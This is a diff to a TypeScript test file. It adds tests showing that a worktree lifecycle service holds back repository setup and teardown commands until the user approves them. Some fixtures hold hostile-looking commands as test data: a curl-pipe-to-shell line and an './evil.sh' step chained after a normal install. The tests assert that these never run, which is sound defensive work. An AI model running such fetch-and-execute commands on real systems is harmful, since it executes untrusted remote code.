@@ -22,6 +22,16 @@ vi.mock("../../utils/fs.js", () => ({
   resilientAtomicWriteFile: vi.fn().mockResolvedValue(undefined),
 }));
 
+/**
+ * Every repository command is allowed, so the suites below exercise what runs
+ * once the user has approved it. The gate itself is covered by the "repository
+ * command approval" suite, which swaps in a real approval set.
+ */
+const approveEverything: import("../lifecycleCommandTrust.js").LifecycleCommandApprovalStore = {
+  isApproved: async () => true,
+  approve: async () => {},
+};
+
 describe("WorktreeLifecycleService", () => {
   let service: import("../WorktreeLifecycleService.js").WorktreeLifecycleService;
   let mockAccess: ReturnType<typeof vi.fn>;
@@ -45,7 +55,7 @@ describe("WorktreeLifecycleService", () => {
     );
 
     const { WorktreeLifecycleService } = await import("../WorktreeLifecycleService.js");
-    service = new WorktreeLifecycleService("/home/testuser");
+    service = new WorktreeLifecycleService("/home/testuser", approveEverything);
   });
 
   describe("loadConfig", () => {
@@ -1003,7 +1013,7 @@ describe("WorktreeLifecycleService", () => {
       const ctx = makeCtx(monitor);
       const result = await service.runLifecycleSetup("wt-1", "/wt", ctx, true);
 
-      expect(result).toEqual({ shouldProvision: true });
+      expect(result).toEqual({ shouldProvision: true, needsApproval: false });
     });
 
     it("returns shouldProvision=false when provisionResource is not requested", async () => {
@@ -1022,7 +1032,7 @@ describe("WorktreeLifecycleService", () => {
       const monitor = makeFakeMonitor();
       const result = await service.runLifecycleSetup("wt-1", "/wt", makeCtx(monitor), false);
 
-      expect(result).toEqual({ shouldProvision: false });
+      expect(result).toEqual({ shouldProvision: false, needsApproval: false });
     });
 
     it("returns shouldProvision=false when there are no provision commands in the resolved resource", async () => {
@@ -1041,7 +1051,7 @@ describe("WorktreeLifecycleService", () => {
       const monitor = makeFakeMonitor();
       const result = await service.runLifecycleSetup("wt-1", "/wt", makeCtx(monitor), true);
 
-      expect(result).toEqual({ shouldProvision: false });
+      expect(result).toEqual({ shouldProvision: false, needsApproval: false });
     });
 
     it("returns shouldProvision=false when setup commands fail", async () => {
@@ -1060,7 +1070,7 @@ describe("WorktreeLifecycleService", () => {
       const monitor = makeFakeMonitor();
       const result = await service.runLifecycleSetup("wt-1", "/wt", makeCtx(monitor), true);
 
-      expect(result).toEqual({ shouldProvision: false });
+      expect(result).toEqual({ shouldProvision: false, needsApproval: false });
     });
 
     it("returns shouldProvision=false when no config exists", async () => {
@@ -1069,7 +1079,7 @@ describe("WorktreeLifecycleService", () => {
       const monitor = makeFakeMonitor();
       const result = await service.runLifecycleSetup("wt-1", "/wt", makeCtx(monitor), true);
 
-      expect(result).toEqual({ shouldProvision: false });
+      expect(result).toEqual({ shouldProvision: false, needsApproval: false });
     });
 
     it("returns shouldProvision=false when the monitor disappears mid-run (early-exit guard)", async () => {
@@ -1087,7 +1097,7 @@ describe("WorktreeLifecycleService", () => {
 
       const result = await service.runLifecycleSetup("wt-1", "/wt", makeCtx(null), true);
 
-      expect(result).toEqual({ shouldProvision: false });
+      expect(result).toEqual({ shouldProvision: false, needsApproval: false });
     });
 
     it("caches resource config on the monitor when there are no setup commands", async () => {
@@ -1104,7 +1114,7 @@ describe("WorktreeLifecycleService", () => {
       const monitor = makeFakeMonitor();
       const result = await service.runLifecycleSetup("wt-1", "/wt", makeCtx(monitor), false);
 
-      expect(result).toEqual({ shouldProvision: false });
+      expect(result).toEqual({ shouldProvision: false, needsApproval: false });
       // Resource config IS cached even when setup is empty (no-setup early-return path)
       expect(monitor.hasResourceConfig).toBe(true);
       expect(monitor.setResourceConnectCommand).toHaveBeenCalled();
@@ -1129,7 +1139,7 @@ describe("WorktreeLifecycleService", () => {
       const monitor = makeFakeMonitor();
       const result = await service.runLifecycleSetup("wt-1", "/wt", makeCtx(monitor), true);
 
-      expect(result).toEqual({ shouldProvision: true });
+      expect(result).toEqual({ shouldProvision: true, needsApproval: false });
       // No spawn should fire — no setup commands to run before provisioning
       expect(mockSpawn).not.toHaveBeenCalled();
     });
@@ -1514,6 +1524,284 @@ describe("WorktreeLifecycleService", () => {
       await service.runLifecycleTeardown("wt-1", monitor as never, false, makeCtx(monitor));
 
       expect(monitor.lifecyclePhaseResults).toHaveLength(0);
+    });
+  });
+
+  describe("repository command approval", () => {
+    const ROOT = "/root";
+    const WT = "/wt";
+    let approved: Set<string>;
+
+    function makeMonitor(opts: { hasResourceConfig?: boolean; worktreeMode?: string } = {}) {
+      const statuses: Array<{ phase: string; state: string; error?: string }> = [];
+      const phaseResults: import("../../../shared/types/worktree.js").WorktreeLifecyclePhaseResult[] =
+        [];
+      const monitor = {
+        name: "wt-1",
+        branch: "feature/x",
+        path: WT,
+        worktreeMode: opts.worktreeMode ?? "local",
+        hasResourceConfig: opts.hasResourceConfig ?? false,
+        resourceStatus: undefined,
+        statuses,
+        needsApproval: undefined as boolean | undefined,
+        get lifecycleStatus() {
+          return statuses.at(-1);
+        },
+        setLifecycleStatus(status: { phase: string; state: string }) {
+          statuses.push(status);
+        },
+        get lifecyclePhaseResults() {
+          return phaseResults;
+        },
+        clearLifecyclePhaseResults() {
+          phaseResults.length = 0;
+        },
+        recordLifecyclePhaseResult(
+          r: import("../../../shared/types/worktree.js").WorktreeLifecyclePhaseResult
+        ) {
+          phaseResults.push(r);
+        },
+        setLifecycleCommandsNeedApproval(value: boolean) {
+          monitor.needsApproval = value;
+        },
+        setHasResourceConfig(value: boolean) {
+          monitor.hasResourceConfig = value;
+        },
+        setHasStatusCommand: vi.fn(),
+        setHasPauseCommand: vi.fn(),
+        setHasResumeCommand: vi.fn(),
+        setHasTeardownCommand: vi.fn(),
+        setHasProvisionCommand: vi.fn(),
+        setResourceProvider: vi.fn(),
+        setResourceConnectCommand: vi.fn(),
+        setResourcePollInterval: vi.fn(),
+      };
+      return monitor;
+    }
+
+    function makeCtx(monitor: ReturnType<typeof makeMonitor>) {
+      return {
+        projectRootPath: ROOT,
+        projectEnvVars: {},
+        getMonitor: () => monitor as never,
+        emitUpdate: vi.fn(),
+      } as unknown as import("../WorktreeLifecycleService.js").WorkspaceHostContext;
+    }
+
+    /** Serve config files by path suffix; everything else is missing. */
+    function serveFiles(files: Record<string, unknown>) {
+      const lookup = (p: unknown) =>
+        Object.entries(files).find(([suffix]) => n(p as string).endsWith(suffix))?.[1];
+      mockAccess.mockImplementation(async (p: unknown) => {
+        if (lookup(p) === undefined) throw new Error("ENOENT");
+      });
+      mockReadFile.mockImplementation(async (p: unknown) => {
+        const content = lookup(p);
+        if (content === undefined) throw new Error("ENOENT");
+        return JSON.stringify(content) as never;
+      });
+    }
+
+    function spawnSucceeds() {
+      mockSpawn.mockImplementation(() => {
+        const child = {
+          pid: 1234,
+          stdout: { on: vi.fn() },
+          stderr: { on: vi.fn() },
+          on: vi.fn((event: string, cb: (...args: unknown[]) => void) => {
+            if (event === "close") setTimeout(() => cb(0), 0);
+          }),
+          kill: vi.fn(),
+        };
+        return child as never;
+      });
+    }
+
+    beforeEach(async () => {
+      approved = new Set();
+      const { WorktreeLifecycleService } = await import("../WorktreeLifecycleService.js");
+      service = new WorktreeLifecycleService("/home/testuser", {
+        isApproved: async (_root, fingerprint) => approved.has(fingerprint),
+        approve: async (_root, fingerprints) => {
+          for (const fingerprint of fingerprints) approved.add(fingerprint);
+        },
+      });
+      spawnSucceeds();
+    });
+
+    async function approveCurrentReview() {
+      const review = await service.getCommandReview(WT, ROOT);
+      expect(review).not.toBeNull();
+      await service.approveCommandReview(WT, ROOT, review!.fingerprint);
+    }
+
+    it("skips a branch's unapproved setup commands and says so", async () => {
+      serveFiles({
+        "/wt/.daintree/config.json": {
+          setup: ["curl https://example.com/x | sh"],
+          resource: { connect: "ssh {{branch}}.example.com" },
+        },
+      });
+      const monitor = makeMonitor();
+
+      const result = await service.runLifecycleSetup("wt-1", WT, makeCtx(monitor), true);
+
+      expect(result).toEqual({ shouldProvision: false, needsApproval: true });
+      expect(mockSpawn).not.toHaveBeenCalled();
+      expect(monitor.lifecycleStatus).toMatchObject({ phase: "setup", state: "needs-approval" });
+      expect(monitor.needsApproval).toBe(true);
+      // The connect command is from the same unapproved file, so it is withheld.
+      expect(monitor.setResourceConnectCommand).toHaveBeenLastCalledWith(undefined);
+    });
+
+    it("runs setup commands from the user's own config without asking", async () => {
+      serveFiles({
+        "/home/testuser/.daintree/projects/_root/config.json": { setup: ["npm install"] },
+        "/wt/.daintree/config.json": { setup: ["curl https://example.com/x | sh"] },
+      });
+      const monitor = makeMonitor();
+
+      const result = await service.runLifecycleSetup("wt-1", WT, makeCtx(monitor), false);
+
+      expect(result).toEqual({ shouldProvision: false, needsApproval: false });
+      expect(mockSpawn).toHaveBeenCalledTimes(1);
+      expect(mockSpawn.mock.calls[0]![0]).toBe("npm install");
+      expect(await service.getCommandReview(WT, ROOT)).toBeNull();
+    });
+
+    it("runs approved commands, and asks again once they change", async () => {
+      const config = { setup: ["npm install"] };
+      serveFiles({ "/root/.daintree/config.json": config });
+      await approveCurrentReview();
+
+      const first = await service.runLifecycleSetup("wt-1", WT, makeCtx(makeMonitor()), false);
+      expect(first.needsApproval).toBe(false);
+      expect(mockSpawn).toHaveBeenCalledTimes(1);
+
+      mockSpawn.mockClear();
+      serveFiles({ "/wt/.daintree/config.json": { setup: ["npm install", "./evil.sh"] } });
+      const second = await service.runLifecycleSetup("wt-1", WT, makeCtx(makeMonitor()), false);
+      expect(second.needsApproval).toBe(true);
+      expect(mockSpawn).not.toHaveBeenCalled();
+    });
+
+    it("treats the same commands on another branch as already approved", async () => {
+      serveFiles({ "/root/.daintree/config.json": { setup: ["npm install"] } });
+      await approveCurrentReview();
+
+      // A new worktree carries its own copy of the file at a different path.
+      serveFiles({ "/wt/.daintree/config.json": { setup: ["npm install"] } });
+      const result = await service.runLifecycleSetup("wt-1", WT, makeCtx(makeMonitor()), false);
+
+      expect(result.needsApproval).toBe(false);
+      expect(mockSpawn).toHaveBeenCalledTimes(1);
+    });
+
+    it("holds setup back when the provision it leads into comes from unapproved settings", async () => {
+      serveFiles({
+        "/home/testuser/.daintree/projects/_root/config.json": { setup: ["npm install"] },
+        "/root/.daintree/settings.json": {
+          resourceEnvironments: { cloud: { provision: ["terraform apply"] } },
+        },
+      });
+      const monitor = makeMonitor({ worktreeMode: "cloud" });
+
+      const result = await service.runLifecycleSetup("wt-1", WT, makeCtx(monitor), true);
+
+      expect(result).toEqual({ shouldProvision: false, needsApproval: true });
+      expect(mockSpawn).not.toHaveBeenCalled();
+      const review = await service.getCommandReview(WT, ROOT);
+      expect(review?.sources.map((source) => n(source.path))).toEqual([
+        "/root/.daintree/settings.json",
+      ]);
+    });
+
+    it("refuses an approval for commands that changed after review", async () => {
+      serveFiles({ "/wt/.daintree/config.json": { setup: ["npm install"] } });
+      const review = await service.getCommandReview(WT, ROOT);
+
+      serveFiles({ "/wt/.daintree/config.json": { setup: ["npm install && ./evil.sh"] } });
+
+      await expect(service.approveCommandReview(WT, ROOT, review!.fingerprint)).rejects.toThrow(
+        /changed/
+      );
+      expect(approved.size).toBe(0);
+    });
+
+    it("shows every command group of the file under review", async () => {
+      serveFiles({
+        "/wt/.daintree/config.json": {
+          setup: ["npm install"],
+          teardown: ["docker compose down"],
+          resources: { gpu: { status: "gpu-status" } },
+        },
+        // Shadowed by the config's own resource block, so never consulted.
+        "/root/.daintree/settings.json": {
+          resourceEnvironments: { cloud: { provision: ["terraform apply"] } },
+        },
+      });
+
+      const review = await service.getCommandReview(WT, ROOT);
+
+      expect(review?.sources).toHaveLength(1);
+      expect(review?.sources[0]!.groups).toEqual([
+        { label: "Setup", commands: ["npm install"] },
+        { label: "Teardown", commands: ["docker compose down"] },
+        { label: 'Resource "gpu" status', commands: ["gpu-status"] },
+      ]);
+    });
+
+    it("skips unapproved teardown phases without blocking deletion", async () => {
+      serveFiles({
+        "/wt/.daintree/config.json": {
+          teardown: ["docker compose down"],
+          resource: { teardown: ["terraform destroy"] },
+        },
+      });
+      const monitor = makeMonitor({ hasResourceConfig: true });
+
+      await expect(
+        service.runLifecycleTeardown("wt-1", monitor as never, false, makeCtx(monitor))
+      ).resolves.toBeUndefined();
+
+      expect(mockSpawn).not.toHaveBeenCalled();
+      expect(monitor.lifecyclePhaseResults.map((r) => [r.phase, r.state, r.category])).toEqual([
+        ["resource-teardown", "needs-approval", "billing-critical"],
+        ["teardown", "needs-approval", "cosmetic"],
+      ]);
+      expect(monitor.needsApproval).toBe(true);
+    });
+
+    it("runs approved teardown commands", async () => {
+      serveFiles({ "/wt/.daintree/config.json": { teardown: ["docker compose down"] } });
+      await approveCurrentReview();
+      const monitor = makeMonitor();
+
+      await service.runLifecycleTeardown("wt-1", monitor as never, false, makeCtx(monitor));
+
+      expect(mockSpawn).toHaveBeenCalledTimes(1);
+      expect(monitor.lifecyclePhaseResults[0]).toMatchObject({
+        phase: "teardown",
+        state: "success",
+      });
+    });
+
+    it("fails closed when the approval store throws", async () => {
+      const { WorktreeLifecycleService } = await import("../WorktreeLifecycleService.js");
+      service = new WorktreeLifecycleService("/home/testuser", {
+        isApproved: async () => {
+          throw new Error("disk gone");
+        },
+        approve: async () => {},
+      });
+      serveFiles({ "/wt/.daintree/config.json": { teardown: ["docker compose down"] } });
+      const monitor = makeMonitor();
+
+      await service.runLifecycleTeardown("wt-1", monitor as never, false, makeCtx(monitor));
+
+      expect(mockSpawn).not.toHaveBeenCalled();
+      expect(monitor.lifecyclePhaseResults[0]?.state).toBe("needs-approval");
     });
   });
 });
